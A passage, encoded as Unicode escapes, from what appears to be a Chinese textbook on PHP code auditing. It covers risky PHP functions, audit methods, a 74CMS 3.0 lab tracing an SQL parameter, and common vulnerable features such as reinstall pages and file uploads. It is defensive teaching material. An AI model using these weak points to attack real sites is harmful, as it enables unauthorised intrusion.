  \u5C06GET\u3001POST\u3001COOKIE\u53D8\u91CF\u5BFC\u5165\u5230\u5168\u5C40\u4F5C\u7528\u57DF\u4E2D\uFF0C\u5982\u679C\u7981\u6B62\u4E86register_globals\u4F46\u53C8\u60F3\u4F7F\u7528\u5168\u5C40\u53D8\u91CF\uFF0C\u53EF\u4EE5\u4F7F\u7528\u8BE5\u51FD\u6570\u3002\r
\r
### 2.3.6 \u7279\u6B8A\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u5E38\u89C1\u7684\u7279\u6B8A\u51FD\u6570\uFF0C\u8FD9\u4E9B\u51FD\u6570\u6D89\u53CA\u7684\u5B89\u5168\u95EE\u9898\u5305\u62EC\uFF1A\u4FE1\u606F\u6CC4\u9732\u3001\u8F6F\u94FE\u63A5\u8BFB\u53D6\u6587\u4EF6\u3001\u73AF\u5883\u53D8\u91CF\u3001\u914D\u7F6E\u8BBE\u7F6E\u3001\u6570\u5B57\u5224\u65AD\u3001\u6570\u7EC4\u5224\u65AD\u3002\u4E0B\u9762\u5BF9\u8FD9\u4E9B\u7279\u6B8A\u51FD\u6570\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
\uFF081\uFF09\u4FE1\u606F\u6CC4\u9732\u51FD\u6570\r
\r
l bool phpinfo()\r
\r
\u8BE5\u51FD\u6570\u5C06\u8F93\u51FAPHP\u7684\u5927\u91CF\u4FE1\u606F\uFF0C\u5305\u62EC\uFF1APHP\u7F16\u8BD1\u9009\u9879\u3001\u542F\u52A8\u7684\u6269\u5C55\u3001PHP\u7248\u672C\u3001\u670D\u52A1\u5668\u4FE1\u606F\u3001PHP\u73AF\u5883\u53D8\u91CF\u3001\u64CD\u4F5C\u7CFB\u7EDF\u7248\u672C\u4FE1\u606F\u3001path\u53D8\u91CF\u3001\u914D\u7F6E\u9009\u9879\u7684\u672C\u5730\u503C\u548C\u4E3B\u503C\u3001HTTP\u5934\u548CPHP\u6388\u6743\u4FE1\u606F\u7B49\u3002\r
\r
\uFF082\uFF09\u8F6F\u94FE\u63A5\u51FD\u6570\u2014\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\r
\r
l bool symlink(string $target, string $link)\r
\r
symlink()\u5BF9\u4E8E\u5DF2\u6709\u7684$target\u53D8\u91CF\u5EFA\u7ACB\u4E00\u4E2A\u540D\u79F0\u4E3A$link\u7684\u8F6F\u94FE\u63A5\u3002\r
\r
l string readlink(string $path)\r
\r
readlink()\u6839\u636E\u4F20\u53C2$path\u8BFB\u53D6\u5176\u6307\u5411\u7684\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
\uFF083\uFF09\u73AF\u5883\u53D8\u91CF\r
\r
l string getenv(string $varname)\r
\r
\u83B7\u53D6\u7CFB\u7EDF\u73AF\u5883\u53D8\u91CF\u7684\u503C\uFF0C\u5305\u62EC\uFF1ASERVER_NAME\uFF08\u4E3B\u673A\u540D\uFF09\u3001SERVER_PROTOCOL\uFF08\u901A\u4FE1\u534F\u8BAE\u548C\u7248\u672C\uFF09\u3001REQUEST_METHOD\uFF08\u8BBF\u95EE\u9875\u9762\u7684\u8BF7\u6C42\u65B9\u6CD5\uFF09\u7B49\u3002\r
\r
l bool putenv(string $setting)\r
\r
\u6DFB\u52A0setting\u5230\u670D\u52A1\u5668\u73AF\u5883\u53D8\u91CF\u4E2D\uFF0C\u73AF\u5883\u53D8\u91CF\u4EC5\u5B58\u6D3B\u4E8E\u5F53\u524D\u8BF7\u6C42\u671F\u95F4\uFF0C\u5728\u8BF7\u6C42\u7ED3\u675F\u65F6\u73AF\u5883\u4F1A\u6062\u590D\u5230\u521D\u59CB\u72B6\u6001\u3002\r
\r
\uFF084\uFF09\u914D\u7F6E\u76F8\u5173\u51FD\u6570\r
\r
l string ini_get(string $varname)\r
\r
\u8BE5\u51FD\u6570\u7528\u6765\u8FD4\u56DE\u914D\u7F6E\u9009\u9879\u7684\u503C\u3002\r
\r
l string ini_set(string $varname, string $newvalue)\r
\r
l string ini_alter(string $varname, string $newvalue)\r
\r
\u4E0A\u8FF0\u51FD\u6570\u7528\u4E8E\u8BBE\u7F6E\u914D\u7F6E\u9009\u9879\u7684\u503C\uFF0C\u6B64\u9009\u9879\u4F1A\u5728\u811A\u672C\u8FD0\u884C\u65F6\u4FDD\u6301\u8BBE\u7F6E\u7684\u503C\uFF0C\u5E76\u5728\u811A\u672C\u7ED3\u675F\u65F6\u6062\u590D\u539F\u6709\u503C\u3002\r
\r
l void ini_restore(string $varname)\r
\r
\u8BE5\u51FD\u6570\u7528\u6765\u6062\u590D\u6307\u5B9A\u7684\u914D\u7F6E\u9009\u9879\u5230\u539F\u6709\u7684\u503C\u3002\r
\r
\uFF085\uFF09\u6570\u5B57\u5224\u65AD\r
\r
l bool is_numeric(mixed $var)\r
\r
\u8BE5\u51FD\u6570\u5982\u679C\u53D8\u91CF$var\u662F\u6570\u5B57\u548C\u6570\u5B57\u5B57\u7B26\u4E32\u5219\u8FD4\u56DETRUE\uFF0C\u5426\u5219\u8FD4\u56DEFALSE\u3002\u8BE5\u51FD\u6570\u5B58\u5728\u7684\u5B89\u5168\u95EE\u9898\u662F\uFF1A\u5982\u679C\u4EC5\u4F7F\u7528is_numeric\u51FD\u6570\u5224\u65AD\u800C\u4E0D\u4F7F\u7528intval\u51FD\u6570\u8F6C\u6362\u5C31\u6709\u53EF\u80FD\u63D2\u516516\u8FDB\u5236\u7684\u5B57\u7B26\u4E32\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u8FDB\u800C\u53EF\u80FD\u5BFC\u81F4SQL\u4E8C\u6B21\u6CE8\u5165\u3002\r
\r
\uFF086\uFF09\u6570\u7EC4\u76F8\u5173\r
\r
l bool in_array(mixed $needle, array $haystack [,bool $strict = FALSE])\r
\r
\u5224\u65AD\u4E00\u4E2A\u503C\u662F\u5426\u5728\u67D0\u4E2A\u6570\u7EC4\u91CC\u9762\uFF0C\u5982\u679C\u5728\u6570\u7EC4\u91CC\u5219\u8FD4\u56DETRUE\uFF0C\u5426\u5219\u8FD4\u56DEFALSE\u3002\u8BE5\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\u662F\u5728\u8FDB\u884C\u6BD4\u8F83\u4E4B\u524D\u4F1A\u81EA\u52A8\u5BF9\u6BD4\u8F83\u6570\u636E\u8FDB\u884C\u7C7B\u578B\u8F6C\u6362\uFF0C\u5982\u679C\u8F6C\u6362\u540E\u7684\u6570\u636E\u5339\u914D\u6210\u529F\u5219\u4F1A\u7ED5\u8FC7\u68C0\u6D4B\u3002\r
\r
## 2.4 \u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF\r
\r
\u672C\u5C0F\u8282\u5C06\u4ECB\u7ECD\u5B66\u4E60\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u5E38\u89C1\u7684\u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF\uFF0C\u53EA\u6709\u7406\u89E3\u4E86\u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF\uFF0C\u624D\u80FD\u66F4\u9AD8\u6548\u7684\u6316\u6398\u51FA\u6709\u8D28\u91CF\u7684\u6F0F\u6D1E\u3002\u867D\u7136\uFF0C\u5F88\u591A\u6709\u7ECF\u9A8C\u7684\u5BA1\u8BA1\u4EBA\u5458\u4E5F\u6709\u81EA\u5DF1\u72EC\u6709\u7684\u5BA1\u8BA1\u6280\u5DE7\uFF0C\u4F46\u603B\u4F53\u6765\u8BF4\u90FD\u662F\u4ECE\u4E0A\u8FF0\u4E09\u79CD\u601D\u8DEF\u6F14\u53D8\u800C\u6765\u3002\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u5305\u62EC\u4E09\u4E2A\u9636\u6BB5\uFF1A\u5BA1\u8BA1\u524D\u51C6\u5907\u5DE5\u4F5C\u3001\u4E86\u89E3\u5BA1\u8BA1\u5BF9\u8C61\u5168\u5C40\u7ED3\u6784\u3001\u5BA1\u8BA1\u5B9E\u65BD\u3002\r
\r
1.\u5BA1\u8BA1\u524D\u51C6\u5907\u9636\u6BB5\r
\r
\u5BA1\u8BA1\u524D\u51C6\u5907\u5DE5\u4F5C\u9700\u8981\u4ECE\u5B98\u7F51\u7AD9\u5230\u5BF9\u5E94\u7248\u672C\u7684\u6E90\u7801\u5305\uFF0C\u5E76\u51C6\u5907\u597D\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\u5728\u672C\u5730\u642D\u5EFA\u7F51\u7AD9\uFF0C\u80FD\u591F\u5B9E\u73B0\u4F7F\u7528PhpStorm\u5DE5\u5177\u4E00\u8FB9\u5BA1\u8BA1\u4E00\u8FB9\u8C03\u8BD5\uFF0C\u8FDB\u884C\u5B9E\u65F6\u7684\u6570\u636E\u52A8\u6001\u8DDF\u8E2A\u3002\r
\r
2.\u4E86\u89E3\u5BA1\u8BA1\u5BF9\u8C61\u5168\u5C40\u7ED3\u6784\r
\r
\u5728PHP\u7F51\u7AD9\u4E2D\uFF0C\u5E38\u89C1\u7684\u76EE\u5F55\u5305\u62EC\uFF1A\u4E3B\u76EE\u5F55\u3001\u6A21\u5757\u76EE\u5F55\u3001\u63D2\u4EF6\u76EE\u5F55\u3001\u4E0A\u4F20\u76EE\u5F55\u3001\u6A21\u677F\u76EE\u5F55\u3001\u6570\u636E\u76EE\u5F55\u3001\u914D\u7F6E\u76EE\u5F55\u7B49\uFF0C\u5BA1\u8BA1\u4EBA\u5458\u9700\u5BF9\u4E0A\u8FF0\u76EE\u5F55\u6709\u6240\u4E86\u89E3\u4ECE\u800C\u638C\u63E1\u8BE5\u7F51\u7AD9\u7684\u6574\u4F53\u76EE\u5F55\u7ED3\u6784\u3002\u540C\u65F6\uFF0C\u9700\u8981\u67E5\u770B\u7A0B\u5E8F\u7684\u914D\u7F6E\u6587\u4EF6\u3001\u5165\u53E3\u6587\u4EF6\u3001\u516C\u5171\u51FD\u6570\u3001\u5B89\u5168\u8FC7\u6EE4\u6587\u4EF6\uFF0C\u4ECE\u800C\u5BF9\u7F51\u7AD9\u5927\u4F53\u529F\u80FD\u6709\u6240\u4E86\u89E3\u3002\r
\r
3.\u5BA1\u8BA1\u5B9E\u65BD\u9636\u6BB5\r
\r
\u5728\u5BA1\u8BA1\u5B9E\u65BD\u9636\u6BB5\uFF0C\u5BA1\u8BA1\u4EBA\u5458\u4ECE\u4EE5\u4E0B\u65B9\u9762\u8FDB\u884C\u5BA1\u8BA1\u5206\u6790\uFF1A\r
\r
l \u914D\u7F6E\u5BA1\u8BA1\u5206\u6790\u73AF\u5883\r
\r
l \u719F\u6089\u5BA1\u8BA1\u7CFB\u7EDF\u7684\u4E1A\u52A1\u6D41\u7A0B\r
\r
l \u5206\u6790\u7A0B\u5E8F\u4F7F\u7528\u7684\u7F16\u7A0B\u6846\u67B6\r
\r
l \u5DE5\u5177\u81EA\u52A8\u5316\u5BA1\u8BA1\u5206\u6790\r
\r
l \u4EBA\u5DE5\u5BA1\u8BA1\u5206\u6790\r
\r
\u5BA1\u8BA1\u5B9E\u65BD\u9636\u6BB5\u4E2D\uFF0C\u5E38\u7528\u601D\u8DEF\u5305\u62EC\u4EE5\u4E0B\u4E09\u79CD\uFF08\u53C2\u8003\u300A\u4EE3\u7801\u5BA1\u8BA1-\u4F01\u4E1A\u7EA7Web\u4EE3\u7801\u5B89\u5168\u67B6\u6784\u300B\uFF09\uFF1A\r
\r
\uFF081\uFF09  \u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\r
\r
\uFF082\uFF09  \u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\r
\r
\uFF083\uFF09  \u901A\u8BFB\u5168\u6587\u6CD5\r
\r
\u672C\u4E66\u5EFA\u8BAE\u4F7F\u7528\u4E0A\u8FF0\u4E09\u79CD\u65B9\u6CD5\u76F8\u7ED3\u5408\u7684\u65B9\u5F0F\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u3002\u9996\u5148\uFF0C\u4F7F\u7528\u901A\u8BFB\u5168\u6587\u6CD5\u5BF9\u7A0B\u5E8F\u7684\u6574\u4F53\u7ED3\u6784\u4E0E\u76EE\u5F55\u3001\u7A0B\u5E8F\u7684\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u3001\u901A\u7528\u51FD\u6570\u3001\u914D\u7F6E\u4FE1\u606F\u7B49\u8FDB\u884C\u4E86\u89E3\u3002\u7136\u540E\uFF0C\u6839\u636E\u5B9A\u5411\u529F\u80FD\u6CD5\u5BF9\u6BCF\u4E00\u9879\u529F\u80FD\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u3002\u6700\u540E\uFF0C\u9488\u5BF9\u6307\u5B9A\u529F\u80FD\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5BF9\u53C2\u6570\u503C\u6570\u636E\u4F20\u9012\u6D41\u7A0B\u8FDB\u884C\u5206\u6790\u3002\r
\r
### 2.4.1 \u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\r
\r
\u4F7F\u7528\u654F\u611F\u53C2\u6570\u6765\u9006\u5411\u8FFD\u8E2A\u53C2\u6570\u7684\u4F20\u9012\u8FC7\u7A0B\uFF0C\u662F\u76EE\u524D\u4F7F\u7528\u6700\u591A\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF0C\u56E0\u4E3A\u5927\u591A\u6570\u6F0F\u6D1E\u662F\u7531\u4E8E\u51FD\u6570\u4E2D\u7F16\u5199\u4EE3\u7801\u8003\u8651\u4E0D\u5468\u5168\u5BFC\u81F4\u7684\u3002\u800C\u8FD9\u4E9B\u51FD\u6570\u5F88\u591A\u90FD\u5B58\u5728\u654F\u611F\u7684\u5173\u952E\u5B57\u53EF\u4EE5\u521D\u6B65\u5224\u5B9A\u4E3A\u654F\u611F\u51FD\u6570\uFF0C\u8FDB\u800C\u5206\u6790\u8FD9\u4E9B\u51FD\u6570\u662F\u5426\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u3002\r
\r
\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u7684\u4F18\u52A3\uFF1A\r
\r
l \u4F18\u70B9\uFF1A\u53EA\u9700\u8981\u641C\u7D22\u76F8\u5E94\u7684\u654F\u611F\u5173\u952E\u5B57\uFF0C\u65E2\u53EF\u5FEB\u901F\u6316\u6398\u6F0F\u6D1E\uFF0C\u6316\u6398\u6548\u7387\u8D28\u91CF\u9AD8\uFF1B\r
\r
l \u7F3A\u70B9\uFF1A\u5BF9\u4EE3\u7801\u6574\u4F53\u7ED3\u6784\u4E0D\u6E05\u6670\uFF0C\u5BF9\u7A0B\u5E8F\u7684\u6574\u4F53\u6846\u67B6\u4E86\u89E3\u4E0D\u6DF1\u5165\uFF0C\u5728\u6316\u6398\u6F0F\u6D1E\u65F6\u5B9A\u4F4D\u6F0F\u6D1E\u9700\u8981\u82B1\u8D39\u65F6\u95F4\uFF0C\u65E0\u6CD5\u5BF9\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u8FDB\u884C\u6316\u6398\u3002\r
\r
### 2.4.2 \u5B9E\u9A8C\uFF1A\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5206\u679074CMS\u6848\u4F8B\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u4EE574CMS3.0\u4E3A\u4F8B\uFF0C\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u8BA9\u8BFB\u8005\u7406\u89E3\u8BE5\u65B9\u6CD5\u7684\u5BA1\u8BA1\u6B65\u9AA4\uFF0C\u8BE5\u6848\u4F8B\u5BA1\u8BA1\u6D41\u7A0B\u5982\u56FE2-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image144.jpg)\r
\r
\u56FE2-6 \u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u6D41\u7A0B\u56FE\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80032.4.1\u8282\uFF1A\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u4E86\u89E3\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5BA1\u8BA1\u6D41\u7A0B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS3.0\u73AF\u5883\uFF1BSeay\u5BA1\u8BA1\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\u9996\u5148\u4F7F\u7528Seay\u4EE3\u7801\u5BA1\u8BA1\u7CFB\u7EDF\u6253\u5F00\u9884\u5BA1\u8BA1\u7A0B\u5E8F\uFF0C\u5E76\u70B9\u51FB\u201C\u81EA\u52A8\u5BA1\u8BA1\u201D\u6309\u94AE\uFF0C\u67E5\u627E\u51FA\u53EF\u80FD\u5B58\u5728\u654F\u611F\u51FD\u6570\u53C2\u6570\u7684\u4EE3\u7801\u5217\u8868\uFF0C\u5982\u56FE2-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image146.jpg)\r
\r
\u56FE2-7 Seay\u81EA\u52A8\u5BA1\u8BA1\u5217\u8868\r
\r
\u4ECE\u654F\u611F\u51FD\u6570\u53C2\u6570\u5217\u8868\u4E2D\u6311\u9009\u4E00\u6761\u8BB0\u5F55\u8FDB\u884C\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u5BA1\u8BA1\uFF0C\u5982\u56FE2-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image148.jpg)\r
\r
\u56FE2-8 \u9700\u5BA1\u8BA1\u9009\u9879\r
\r
\u53CC\u51FB\u672C\u6761\u8BB0\u5F55\u5B9A\u4F4D\u5230\u6F0F\u6D1E\u4EE3\u7801\uFF0C\u7136\u540E\u5BA1\u8BA1\u4EE3\u7801\u4E2D\u7684\u53EF\u63A7\u53D8\u91CF\u4F20\u9012\u8FC7\u7A0B\uFF0C\u5982\u56FE2-9\u6240\u793A\u3002\u4EE3\u7801\u201C$sql="select * from ".table('explain')." where id=".$id." LIMIT 1";\u201D\u4E2D\u53EF\u63A7\u53D8\u91CF\u4E3A\u201C$id\u201D\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image150.jpg)\r
\r
\u56FE2-9 \u5BA1\u8BA1SQL\u8BED\u53E5\r
\r
\u4ECE\u754C\u9762\u5DE6\u4FA7\u7684\u201C\u6587\u5B57\u67E5\u627E\u201D\u680F\u4E2D\u53EF\u4EE5\u67E5\u770B\u5F53\u524DPHP\u4EE3\u7801\u4E2D\u5B58\u5728\u7684\u51FD\u6570\u5217\u8868\u53CA\u53D8\u91CF\u5217\u8868\uFF0C\u4ECE\u53D8\u91CF\u5217\u8868\u4E2D\u9009\u62E9\u4E0A\u8FF0\u5DF2\u5B9A\u4F4D\u7684\u53EF\u63A7\u53D8\u91CF\u201C$id\u201D\uFF0C\u5373\u53EF\u770B\u5230\u8BE5PHP\u9875\u9762\u4E2D\u6240\u6709\u5173\u4E8E\u8BE5\u53D8\u91CF\u7684\u8D4B\u503C\u4F20\u9012\u8FC7\u7A0B\uFF0C\u5982\u56FE2-10\u6240\u793A\u3002\u70B9\u51FB\u8BE5\u53D8\u91CF\u7684\u8D4B\u503C\u9009\u9879\u53EF\u81EA\u52A8\u5B9A\u4F4D\u5230\u6307\u5B9A\u4F4D\u7F6E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image152.jpg)\r
\r
\u56FE2-10 \u53EF\u63A7\u53D8\u91CFid\u8C03\u7528\u4FE1\u606F\r
\r
\u81F3\u6B64\u786E\u5B9A\u4E86\u67D0\u53EF\u7591\u51FD\u6570\u4E2D\u7684\u53EF\u63A7\u53D8\u91CF$id\u7684\u4F20\u9012\u8FC7\u7A0B\uFF0C\u5982\u56FE1-25\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image154.jpg)\r
\r
\u56FE1-25 \u53EF\u63A7\u53D8\u91CFid\u8C03\u7528\u56FE\r
\r
\u672C\u6848\u4F8B\u4E2D\u8BE5SQL\u8BED\u53E5\u7684\u53EF\u63A7\u53D8\u91CF\u4E3A\u201C$id\u201D\uFF0C\u8BE5\u53D8\u91CF\u901A\u8FC7\u8BED\u53E5\u201C$id=!empty($_GET['id'])?intval($_GET['id']):'';\u201D\u8FDB\u884C\u8D4B\u503C\uFF0C\u7136\u540E\u901A\u8FC7\u4E09\u76EE\u8FD0\u7B97\u7B26\u786E\u5B9AGET\u65B9\u6CD5\u4F20\u9012\u7684\u53C2\u6570id\u662F\u5426\u4E3A\u7A7A\uFF0C\u82E5\u4E0D\u4E3A\u7A7A\u5219\u4F7F\u7528intval\u8FDB\u884C\u6574\u6570\u8F6C\u6362\u3002\u8BE5\u884C\u4EE3\u7801\u867D\u672A\u7528\u5355\u5F15\u53F7\u8FDB\u884C\u95ED\u5408\u5305\u542B\uFF0C\u4F46\u4F7F\u7528intval\u51FD\u6570\u5BF9\u4F20\u53C2\u8FDB\u884C\u4FDD\u62A4\uFF0C\u56E0\u6B64\u4E0D\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u672C\u6848\u4F8B\u8F83\u4E3A\u7B80\u5355\uFF0C\u5E76\u6CA1\u6709\u8FC7\u591A\u7684\u51FD\u6570\u8C03\u7528\u4E0E\u53C2\u6570\u8FC7\u6EE4\uFF0C\u8BFB\u8005\u610F\u5728\u4E86\u89E3\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u7684\u601D\u8DEF\u3002\r
\r
### 2.4.3 \u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\r
\r
\u7A0B\u5E8F\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u4E00\u822C\u90FD\u4EE5\u529F\u80FD\u6A21\u5757\u4E3A\u5355\u4F4D\u5206\u914D\u6307\u5B9A\u4EBA\u5458\u8FDB\u884C\u5F00\u53D1\u4E0E\u7EF4\u62A4\u3002\u800C\u4F5C\u4E3A\u5B89\u5168\u4EBA\u5458\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u4E5F\u53EF\u4EE5\u6839\u636E\u7A0B\u5E8F\u7684\u529F\u80FD\u6765\u5BA1\u8BA1\u529F\u80FD\u70B9\u5B58\u5728\u7684\u6F0F\u6D1E\uFF0C\u5176\u5206\u6790\u8FC7\u7A0B\u5982\u4E0B\uFF1A\r
\r
\uFF081\uFF09  \u5B89\u88C5\u5E76\u8FD0\u884C\u5F85\u5BA1\u8BA1\u7A0B\u5E8F\u3002\r
\r
\uFF082\uFF09  \u5BF9\u5DF2\u5B89\u88C5\u7A0B\u5E8F\u8FDB\u884C\u719F\u6089\uFF0C\u786E\u5B9A\u7A0B\u5E8F\u7684\u529F\u80FD\u5217\u8868\u3001\u5B9E\u73B0\u539F\u7406\u7B49\u3002\r
\r
\uFF083\uFF09  \u5BF9\u5B58\u5728\u5B89\u5168\u95EE\u9898\u7684\u5E38\u89C1\u529F\u80FD\u70B9\u8FDB\u884C\u9ED1\u76D2\u6D4B\u8BD5\uFF0C\u786E\u5B9A\u529F\u80FD\u5B58\u5728\u7684\u5E38\u89C1\u6F0F\u6D1E\u60C5\u51B5\u3002\r
\r
\uFF084\uFF09  \u5BF9\u6709\u7591\u95EE\u6216\u9057\u6F0F\u7684\u529F\u80FD\u70B9\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u3002\r
\r
\u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5\u7684\u4F18\u52A3\uFF1A\r
\r
l \u4F18\u70B9\uFF1A\u6839\u636E\u5E38\u89C1\u529F\u80FD\u5B9A\u4F4D\u5B89\u5168\u95EE\u9898\u4E14\u914D\u5408\u9ED1\u76D2\u6D4B\u8BD5\uFF0C\u63D0\u5347\u4EE3\u7801\u5BA1\u8BA1\u6548\u7387\u3002\r
\r
l \u7F3A\u70B9\uFF1A\u8981\u6C42\u5BA1\u8BA1\u4EBA\u5458\u6709\u4E00\u5B9A\u7ECF\u9A8C\uFF0C\u80FD\u591F\u5BF9\u5E38\u89C1\u529F\u80FD\u6A21\u5757\u5B58\u5728\u7684\u5B89\u5168\u95EE\u9898\u8FDB\u884C\u6D4B\u8BD5\u3002\r
\r
\u5E38\u89C1\u7684\u529F\u80FD\u6F0F\u6D1E\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
l \u7A0B\u5E8F\u521D\u59CB\u5B89\u88C5\r
\r
l \u7AD9\u70B9\u4FE1\u606F\u6CC4\u9732\r
\r
l \u6587\u4EF6\u4E0A\u4F20\r
\r
l \u6587\u4EF6\u7BA1\u7406\r
\r
l \u767B\u5F55\u8BA4\u8BC1\r
\r
l \u6570\u636E\u5E93\u5907\u4EFD\u4E0E\u6062\u590D\r
\r
l \u627E\u56DE\u5BC6\u7801\r
\r
l \u9A8C\u8BC1\u7801\r
\r
\u4E0B\u9762\u5BF9\u5BB9\u6613\u51FA\u73B0\u5B89\u5168\u6F0F\u6D1E\u7684\u529F\u80FD\u70B9\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
\uFF081\uFF09  \u7A0B\u5E8F\u521D\u59CB\u5B89\u88C5\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u4E00\u822C\u5728PHP\u6E90\u7801\u7A0B\u5E8F\u90FD\u6709\u4E00\u4E2A\u521D\u59CB\u5B89\u88C5\u7684\u529F\u80FD\uFF0C\u5982\u679C\u76F8\u5173\u4EE3\u7801\u6CA1\u6709\u5BF9\u53C2\u6570\u8FDB\u884C\u4E25\u683C\u8FC7\u6EE4\uFF0C\u53EF\u80FD\u4F1A\u5BFC\u81F4\u653B\u51FB\u8005\u8BBF\u95EE\u5B89\u88C5\u9875\u9762(install.php)\u6216\u6784\u9020\u6570\u636E\u5305\uFF0C\u5BF9\u7F51\u7AD9\u8FDB\u884C\u91CD\u65B0\u5B89\u88C5\uFF0C\u4ECE\u800C\u5371\u5BB3\u7F51\u7AD9\u5B89\u5168\uFF0C\u751A\u81F3\u62FF\u5230\u670D\u52A1\u5668\u6743\u9650\uFF0C\u5C06\u6B64\u6F0F\u6D1E\u79F0\u4E3A\u201C\u91CD\u88C5\u6F0F\u6D1E\u201D\u3002\r
\r
\uFF082\uFF09  \u7AD9\u70B9\u4FE1\u606F\u6CC4\u9732\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u901A\u8FC7robots.txt\u6CC4\u9732\u7F51\u7AD9\u9690\u85CF\u76EE\u5F55\u3001\u6587\u4EF6\u3001\u7AD9\u70B9\u7ED3\u6784\u3002\r
\r
l \u7F51\u7AD9\u7AD9\u70B9\u7684\u5907\u4EFD\u6587\u4EF6\u672A\u5220\u9664\u5BFC\u81F4\u7684\u6CC4\u9732\uFF0C\u53EF\u80FD\u4F1A\u6CC4\u9732\u7F51\u7AD9\u6E90\u4EE3\u7801\u3002\r
\r
l \u6CA1\u6709\u6B63\u786E\u5904\u7406\u7F51\u7AD9\u7684\u4E00\u4E9B\u9519\u8BEF\u6D88\u606F\uFF0C\u5728\u9519\u8BEF\u6D88\u606F\u4E2D\u6CC4\u9732\u6570\u636E\u5E93\u8868\u3001\u5B57\u6BB5\u7B49\u3002\r
\r
\uFF083\uFF09  \u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u540E\u53F0\u7A0B\u5E8F\u5BF9\u6587\u4EF6\u4E0A\u4F20\u683C\u5F0F\u8FC7\u6EE4\u4E0D\u4E25\u683C\u5BFC\u81F4\u7684\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\r
\r
l \u5BF9\u6587\u4EF6\u540D\u8FC7\u6EE4\u4E0D\u4E25\u683C\u5BFC\u81F4\u7684\u901A\u8FC7\u6587\u4EF6\u540D\u8FDB\u884CSQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\uFF084\uFF09  \u6587\u4EF6\u7BA1\u7406\u529F\u80FD\u5E38\u89C1\u6F0F\u6D1E\u5305\u62EC\uFF1A\r
\r
l \u7F51\u7AD9\u5C06\u6587\u4EF6\u540D\u6216\u6587\u4EF6\u8DEF\u5F84\u4F5C\u4E3A\u53C2\u6570\u8FDB\u884C\u4F20\u9012\uFF0C\u53C2\u6570\u8FC7\u6EE4\u4E0D\u4E25\u683C\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u3002\r
\r
